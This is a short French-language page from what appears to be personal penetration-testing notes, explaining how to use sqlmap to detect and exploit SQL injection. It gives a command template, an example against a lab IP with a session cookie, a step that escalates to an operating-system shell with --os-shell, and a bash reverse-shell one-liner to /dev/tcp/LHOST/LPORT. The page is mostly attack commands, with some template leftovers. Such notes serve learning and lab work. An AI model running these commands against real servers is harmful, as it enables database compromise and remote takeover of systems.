<sub>[Procédure serveur](server_procedure.md)&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;[Cryptage](cryptage.md)&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;[Outils](tools.md)&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;[Sites utiles](useful_website.md)&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;[Lexique](lexique.md)&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;[Index](index.md)</sub>
<sub>[Retour](sql_injection.md)</sub>
#SQL Map


**Utilisation :** Détecter et exploiter des failles de type [injection SQL](sql_injection.md) en injectant du code dans le serveur attaqué.

**CMD :** sqlmap -u **URL**?**PARAM**=any+query' --cookie="**COOKIE**"

**Arguments :**
- **-exemple :** exemple

**Exemple :** sqlmap -u 'ht<span>tp://10.10.10.10/test.php?search=any+query' --cookie="PHPSESSID=7u6p9qbhb44sefesfsqzzqde4ro8u1

**Help :**
- cmd : détails => *ex **ARGS***

**Procédure :**
- si le retour :  *GET parameter 'search' is vulnerable. Do you want to keep testing the others (if any)? [y/N]* => c'est bon
- relancer en ajoutant *--os-sql* ou autre. ex :  *sqlmap -u 'http:/<span>/10.10.10.10/test.php?search=any+query' --cookie="PHPSESSID=7u6p9qbhb44sefesfsqzzqde4ro8u1" --os-shell*
- la console n'est pas stable donc procéder à un [reverse shell](reverse_shell.md). ex : *bash -c "bash -i >& /dev/tcp/**LHOST**/**LPORT** 0>&1"*